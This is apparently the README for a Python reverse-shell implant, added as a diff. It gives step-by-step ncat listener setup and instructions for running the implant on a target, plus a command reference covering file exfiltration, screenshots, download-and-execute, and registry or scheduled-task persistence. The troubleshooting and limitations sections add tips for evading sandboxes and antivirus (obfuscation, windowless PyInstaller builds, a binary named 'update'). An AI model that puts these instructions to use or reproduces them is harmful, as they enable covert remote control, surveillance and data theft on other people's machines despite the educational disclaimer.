@@ -1,0 +1,403 @@
+⠀  ⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⣤⠀⠀⠀⠀
+⠀⠀⣰⠋⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⣟⠳⡄⠀⠀
+⢀⡾⠁⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⡿⠀⠙⣆⠀
+⢸⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⡇⠀⠀⠘⡄
+⢸⠀⢠⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⣸⠀⢀⠄⢰⠁
+⢸⠀⠈⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⢠⠇⠀⡜⠀⢸⠀
+⠸⡄⠀⠸⡄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⣠⠏⠀⡸⠁⠀⣸⠀
+⠀⢻⡄⠀⢱⡀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⢠⠃⠀⣰⠇⠀
+⠀⠀⢻⡄⠀⢧⠀⡀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⢠⢀⠏⠀⣴⠏⠀⠀
+⠀⠀⠀⢻⣆⠘⣆⢣⠀⠀⠳⣄⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⠟⢛⡛⠛⠛⠛⢛⣛⡛⠛⠛⠛⢻⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⡴⠋⠀⢠⠇⡼⠀⣼⠋⠀⠀⠀
+⠀⠀⠀⠀⢹⣦⢹⡄⣇⠀⡀⠈⠳⣤⣶⣿⣿⣿⣿⡿⠻⣧⡙⢷⡌⠀⠀⠀⠀⠀⠀⠀⠀⠈⣰⡟⣡⡿⠛⢿⣿⣿⣿⣿⣦⣤⠞⠁⢀⠀⡎⣰⢃⣾⠃⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢻⣷⣷⠸⡄⢱⡀⠀⠀⠉⢹⣿⣿⠃⠖⠀⠈⣿⡜⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠏⠀⠀⠀⠹⣿⣿⠋⠁⠀⠀⢠⠃⣸⢱⣧⣾⠏⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢻⣿⣧⢳⡀⢳⡀⠀⠀⢸⣿⠃⡂⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⣀⡀⠹⣿⠀⠀⠀⢠⠃⢠⢇⣿⣿⠏⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⢿⣿⣾⣇⠀⢷⡀⠀⣾⢃⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⢻⣇⠀⣠⡏⢀⣾⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡆⠈⢷⣼⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣴⡟⠀⣼⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣼⡿⠛⢿⣿⣿⡀⣼⠏⣿⠃⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣯⢻⣄⢰⣿⣿⡿⢻⣿⡆⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢰⣿⢿⡄⠀⢻⣿⡟⢡⠸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠙⣻⣿⠏⠀⣰⣟⣿⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⣿⣼⣷⡀⠀⢿⣷⠘⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠰⢠⣿⡇⠂⣰⣿⣼⣿⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢿⣻⣿⡇⢰⣿⡏⠠⠀⣼⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⢠⠘⢿⣧⡀⢿⣿⣻⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⠟⠀⣿⣿⠀⣠⣴⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣀⢸⣿⡇⠚⢿⣿⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⠘⠢⠘⣿⣿⡟⠡⠄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡇⠀⠐⠀⠀⠀⢿⣄⠁⠀⠀⠀⠀⠀⠀⠀⠂⠀⠙⣿⣿⡿⢁⠀⣸⣿⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠸⣿⣿⣦⡀⠈⢿⣿⣦⣀⠁⠀⠀⣀⣀⣀⣠⣴⣿⣟⠀⠀⠀⠀⠀⠀⠈⣿⣷⣤⣀⣀⣀⣀⠀⠀⢀⣠⣾⣿⣟⢡⣿⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢹⡇⠹⣷⡔⠸⣧⠉⠛⠛⠛⠛⠉⠉⠉⠙⠻⣿⣿⡆⡄⠀⠀⠀⠀⣾⣿⡿⠛⠉⠉⠉⠉⠛⠛⠛⠋⢁⡿⠘⣼⡿⢁⣿⠃⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢸⡇⢰⣿⣇⢠⠙⣦⡀⠀⠀🔴⠀⠀⠀⠀⢀⣼⣿⡇⠀⠀⠀⠀⠀⣿⡿⣆⠀⠀⠀⠀🔴⠀⠀⠀⣠⡾⣡⢦⣿⣧⡜⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣸⡇⢸⣿⣿⠘⠃⠈⠙⠿⠶⣶⣤⣤⣴⣶⣿⣥⣿⠇⠀⠀⠀⠀⠀⢿⣧⣬⣷⣶⣤⣤⣴⡶⠶⠟⠉⠀⠀⢸⣿⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢻⣷⣼⣿⢿⣧⡀⠀⡀⠀⡀⠀⣀⣤⣀⡀⣌⠻⣷⡐⠀⠀⠀⠀⠀⣠⡟⠉⠀⢀⣀⣄⡀⠀⠀⠀⠀⠀⣠⣾⡿⣿⣤⣿⠇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡇⡌⠻⣿⣦⣈⣉⣴⣾⣿⣯⣿⣿⠈⠂⠈⠁⠀⠀⠀⠀⠀⠉⠀⠀⢰⢿⣿⣿⣿⣦⣄⣀⣠⣾⣿⠏⠀⣿⣏⠉⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠁⠀⠈⠛⢿⣿⣟⠁⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣈⣿⡇⠛⣿⣿⠟⠋⠵⠂⠀⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡄⠇⢰⣆⠀⠈⣷⢹⣦⠙⢿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⠿⢃⣾⢻⡟⠈⢀⣾⠃⠀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣄⠀⠹⣆⠀⢸⣿⣿⣧⠀⢀⣿⠻⣿⣷⣌⠀⠀⠀⠀⢀⣤⣿⡿⢻⣿⠀⢠⣿⣿⣿⢁⢀⣾⢃⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣧⡀⢿⣧⠀⢿⣿⣿⡆⣾⢻⡆⣈⠻⣿⣷⣦⣤⣴⣿⡿⠋⡄⣼⢻⣄⣾⣿⣿⡏⢠⣿⠃⣰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣆⣿⣧⠸⣿⣿⣿⣿⠈⣷⡙⠳⠆⠉⠉⠉⠉⠁⠀⠁⣠⡟⠀⣿⣿⣿⡿⢠⣿⢁⣼⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⣿⣿⣿⣿⠀⢹⣿⡟⢶⡦⣤⣤⣤⣶⠾⣿⣻⠃⢀⣿⣿⣿⢧⣿⣷⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⠟⣋⣸⡀⠀⢳⡉⠙⠓⠛⠓⠛⠚⠉⣩⠏⠀⢸⣄⡙⢿⣾⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⡿⣿⣿⣧⠀⠀⢹⣀⣀⣀⣀⣀⣀⣰⠃⠀⢠⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣧⢻⣿⠿⣷⣄⣼⣇⣠⣧⣇⣿⣀⣸⣄⣠⣿⢟⣿⢃⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡄⠻⣷⣤⣬⣥⠿⠿⠿⠿⠿⠿⢯⣭⣤⣴⡿⠃⣸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⡀⠤⡍⠁⠀⠀⠀⠀⠒⠀⠀⡀⡄⠉⣉⠀⣰⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⣤⣤⣤⣤⣴⣶⣷⣶⣤⣤⣤⣤⣴⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠋⠉⠁⠀⠀⠀⠉⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+================================================================================
+DOPA CODE REVERSE SHELL - DOCUMENTATION
+================================================================================
+
+IMPORTANT LEGAL & ETHICAL NOTICE
+--------------------------------------------------------------------------------
+This tool is provided exclusively for educational purposes, authorized
+penetration testing, security research, and CTF/lab environments.
+
+You must only use it on systems you own or have explicit written permission
+to test. Unauthorized access to computer systems is a criminal offense in most
+jurisdictions (e.g., CFAA in the US, Computer Misuse Act in the UK, and
+equivalent laws worldwide).
+
+The author and distributors assume no liability for any misuse of this
+software. You are solely responsible for your actions and for ensuring you
+operate within the scope of your authorization.
+
+
+================================================================================
+1. OVERVIEW
+================================================================================
+
+reverseshell.py is a professional-grade reverse shell client written in
+Python 3. A reverse shell works the opposite way of a traditional shell: the
+target machine (the "implant") initiates an outbound connection to the
+attacker's machine (the "listener"), which makes it useful in authorized
+security assessments where inbound connections are blocked by firewalls.
+
+Once connected, the operator can:
+
+- Execute any system command (whoami, ipconfig, dir, ...)
+- Execute PowerShell commands with execution policy bypass
+- Download / upload files to and from the target
+- Take screenshots of the target's screen
+- Install persistence mechanisms (registry or scheduled task)
+- Gather system information in JSON format
+- Manage processes (list and kill)
+- Download and execute payloads remotely
+- Automatically reconnect if the connection drops
+
+
+================================================================================
+2. REQUIREMENTS
+================================================================================
+
+2.1 On the target machine (implant)
+--------------------------------------------------------------------------------
+Operating system : Windows (primary) / Linux (partial support)
+Python           : 3.6 or newer
+Permissions      : No admin rights required for most commands
+
+2.2 On the attacker machine (listener)
+--------------------------------------------------------------------------------
+Nmap / Ncat      : REQUIRED - used to receive the connection
+Any OS           : Windows, Linux, macOS
+
+WHY NCAT?
+Ncat is the modern reimplementation of Netcat, included in the Nmap suite.
+It provides the listening socket that accepts the incoming connection from
+the implant and lets you type commands interactively.
+
+
+================================================================================
+3. INSTALLING NMAP (WITH NCAT)
+================================================================================
+
+3.1 Windows
+--------------------------------------------------------------------------------
+1. Download the installer from the official site: https://nmap.org/download.html
+2. Choose the nmap-<version>-setup.exe installer (or the zip version).
+3. Run the installer. Keep the default installation path
+   (usually C:\Program Files (x86)\Nmap\).
+4. Verify the installation by opening a new terminal and running:
+
+   & "C:\Program Files (x86)\Nmap\ncat.exe" --version
+
+   You should see output similar to:
+
+   Ncat: Version 7.80 ( https://nmap.org/ncat )
+
+5. (Optional) Add the Nmap folder to your PATH so you can type "ncat"
+   instead of the full path:
+
+   [Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Program Files (x86)\Nmap", "User")
+
+3.2 Linux (Debian/Ubuntu/Kali)
+--------------------------------------------------------------------------------
+   sudo apt update
+   sudo apt install nmap
+   ncat --version
+
+3.3 macOS
+--------------------------------------------------------------------------------
+   brew install nmap
+   ncat --version
+
+
+================================================================================
+4. INSTALLATION OF THE REVERSE SHELL
+================================================================================
+
+1. Copy reverseshell.py to the target machine.
+
+2. (Recommended) Create a Python virtual environment:
+
+   cd C:\path\to\your\folder
+   python -m venv .venv
+   .\.venv\Scripts\Activate.ps1
+
+3. No third-party packages are required - the script only uses Python's
+   standard library (socket, subprocess, os, base64, ...).
+
+4. (Optional) Edit the configuration block at the top of the file:
+
+   HOST = "127.0.0.1"       # IP of the listener (attacker machine)
+   PORT = 4444              # Port of the listener
+   RECONNECT_DELAY = 5      # Seconds between reconnection attempts
+   MAX_RECONNECTS = -1      # -1 = reconnect forever, or a number to limit
+   STARTUP_DELAY = 0        # Optional delay before connecting (sandbox evasion)
+
+
+================================================================================
+5. USAGE
+================================================================================
+
+STEP 1 - Start the listener (attacker machine)
+--------------------------------------------------------------------------------
+Open a terminal and run Ncat in listen mode (-l), verbose (-v), no DNS
+resolution (-n), on the port you configured (-p 4444):
+
+   # Windows (full path)
+   & "C:\Program Files (x86)\Nmap\ncat.exe" -lvnp 4444
+
+   # Or if Nmap is in your PATH / Linux / macOS
+   ncat -lvnp 4444
+
+You should see:
+
+   Ncat: Version 7.80 ( https://nmap.org/ncat )
+   Ncat: Listening on :::4444
+   Ncat: Listening on 0.0.0.0:4444
+
+STEP 2 - Run the implant (target machine)
+--------------------------------------------------------------------------------
+   python reverseshell.py
+
+STEP 3 - Operate
+--------------------------------------------------------------------------------
+When the connection is established, the listener shows the connection banner
+and a prompt:
+
+   Ncat: Connection from 192.168.1.20.
+   Ncat: Connection from 192.168.1.20:56789.
+   Connected | DESKTOP-ABC123 | Windows 10
+   > whoami
+   desktop-abc123\operator
+   > ipconfig
+   ...
+   > help
+
+TIP: For testing on your own machine, set HOST = "127.0.0.1" and open two
+terminals on the same PC.
+
+
+================================================================================
+6. COMMAND REFERENCE
+================================================================================
+
+Command                   Description
+--------------------------------------------------------------------------------
+shell <cmd>               Execute a command via cmd.exe (Windows) or sh
+powershell <cmd>          Execute a command via PowerShell (bypass policy)
+ps <cmd>                  Alias for powershell
+cd <dir>                  Change working directory
+pwd / cwd                 Print working directory
+ls [dir] / dir            List directory contents
+cat <file>                Display file contents
+rm <path>                 Delete a file or directory
+mkdir <dir>               Create a directory
+mv <src> <dst>            Move or rename a file
+pslist / tasklist         List running processes
+kill <PID>                Force-terminate a process
+info / sysinfo            System information as JSON
+screenshot                Take a screenshot, sends it to the listener
+download <path>           Exfiltrate a file from the target
+upload <path>             Upload a local file to the target
+download_exec <url>       Download and execute a payload from a URL
+persist [runkey|task]     Install persistence (Windows)
+sleep <secs>              Pause the shell
+cls                       Clear the listener screen
+exit / quit               Close the connection (implant keeps reconnecting)
+die                       Permanent shutdown of the implant
+help / ?                  Show the command list
+
+Any other command (e.g. whoami, net users, dir C:\) is passed directly to
+the system shell and its output is returned.
+
+
+================================================================================
+7. HOW IT WORKS (TECHNICAL DETAILS)
+================================================================================
+
+7.1 Connection flow
+--------------------------------------------------------------------------------
+[Implant]                         [Listener (ncat)]
+    |                                     |
+    |---- TCP connect (outbound) -------->|
+    |<--- banner: Connected | hostname ---|
+    |<--- command prompt "> " ------------|
+    |                                     |
+    |<--------- command ----------------  |
+    |--------- command output ----------->|
+    |<--------- command ----------------  |
+    |--------- command output ----------->|
+    ...
+
+1. The implant resolves HOST:PORT and creates a TCP socket.
+2. It connects outbound, which is why firewalls rarely block it.
+3. The listener receives the connection and displays the banner.
+4. Both sides exchange lines of text: commands in, output out.
+5. If the connection dies, the implant waits RECONNECT_DELAY seconds and
+   tries again - indefinitely by default.
+
+7.2 Command execution
+--------------------------------------------------------------------------------
+- Commands are decoded from UTF-8 and stripped of whitespace.
+- Built-in commands (cd, ls, download, ...) are handled directly in Python.
+- Everything else goes through subprocess.run() with cmd.exe /c (Windows)
+  or sh -c (Linux), capturing both stdout and stderr.
+- Output is truncated at MAX_OUTPUT (2 MB) to avoid flooding the socket.
+
+7.3 File transfer (download / upload / screenshot)
+--------------------------------------------------------------------------------
+- Files are read into memory and encoded as Base64.
+- The data is sent in 4 KB chunks with a small delay between chunks to
+  avoid overflowing the socket buffer.
+- A [FILE] header announces name, size, and SHA-256 hash.
+- The transfer ends with an EOF marker.
+- The SHA-256 digest lets the operator verify integrity after the transfer.
+
+7.4 Screenshot
+--------------------------------------------------------------------------------
+- Uses a PowerShell one-liner with System.Windows.Forms and System.Drawing
+  to capture the primary screen to a PNG in %TEMP%.
+- The PNG is then exfiltrated through the same file-transfer mechanism.
+
+7.5 Persistence
+--------------------------------------------------------------------------------
+Two methods are available (Windows only):
+
+   Method    Technique
+   ------------------------------------------------------------------------
+   runkey    Adds an entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+   task      Registers a scheduled task triggered AtLogOn (default)
+
+The scheduled task approach uses pythonw.exe when available so the implant
+runs without a visible console window.
+
+7.6 Reconnection and shutdown
+--------------------------------------------------------------------------------
+- RECONNECT_DELAY (default 5 s) controls how long the implant waits between
+  attempts.
+- MAX_RECONNECTS = -1 means infinite retries; set a positive number to limit
+  them.
+- Typing "die" creates a .stop marker file next to the script. On the next
+  loop iteration the implant checks for this file and exits permanently.
+
+
+================================================================================
+8. TROUBLESHOOTING
+================================================================================
+
+Problem                                    Solution
+--------------------------------------------------------------------------------
+"Connection refused" in implant terminal   The listener is not running.
+                                           Start ncat first.
+
+Ncat shows "Connection from 127.0.0.1."    The implant connected before you
+but no prompt                              looked; wait for the banner or
+                                           restart the implant.
+
+"ncat" is not recognized as a command      Nmap is not in your PATH - use
+                                           the full path:
+                                           & "C:\Program Files (x86)\Nmap\ncat.exe"
+
+The implant connects and immediately       Wrong HOST/PORT, or a firewall
+disconnects                                dropped the connection.
+
+Command output is cut off                  Output larger than 2 MB is
+                                           truncated by design (MAX_OUTPUT).
+
+Antivirus flags the script                 Expected behavior: AVs detect
+                                           reverse shells. Compile with
+                                           PyInstaller + obfuscate, or run
+                                           in a lab VM with AV disabled.
+
+The implant stops after some reconnects    You set a finite MAX_RECONNECTS;
+                                           set it to -1.
+
+PowerShell commands fail                    The script already uses
+                                           -ExecutionPolicy Bypass; check
+                                           that PowerShell is installed.
+
+
+================================================================================
+9. LIMITATIONS (HONEST DISCLOSURE)
+================================================================================
+
+- Plaintext traffic: this ncat version sends commands and output in
+  cleartext - anyone sniffing the network can read them. For encrypted
+  operation, use the AES-GCM version of the tool instead.
+
+- No authentication: ncat does not verify who connects. Anyone who can reach
+  the port could connect to your listener.
+
+- Memory usage: file transfers load the whole file into RAM.
+
+- Windows-oriented: screenshots and persistence are Windows-only.
+
+- AV detection: as a known reverse-shell pattern, it is flagged by most
+  antivirus engines. This is expected and by design.
+
+- Python dependency: the target needs a Python interpreter unless you
+  compile it to a standalone EXE with PyInstaller:
+
+     pip install pyinstaller
+     pyinstaller --onefile --noconsole --name update reverseshell.py
+
+
+================================================================================
+10. QUICK START (CHEAT SHEET)
+================================================================================
+
+   # 1. Attacker: start the listener
+   & "C:\Program Files (x86)\Nmap\ncat.exe" -lvnp 4444
+
+   # 2. Victim: run the implant
+   python reverseshell.py
+
+   # 3. Operate
+   > help
+   > whoami
+   > sysinfo
+   > download C:\Users\Public\document.pdf
+   > screenshot
+   > persist task
+   > exit
+
+
+================================================================================
+11. LICENSE AND RESPONSIBILITY
+================================================================================
+
+This project is released for educational and authorized security testing
+purposes only. By using this software you agree to:
+
+1. Use it only on systems you own or are explicitly authorized to test.
+2. Never deploy it on systems without written permission.
+3. Accept full responsibility for any consequences of its use.
+
+REMEMBER: Authorization is not optional. Unauthorized access is a crime.
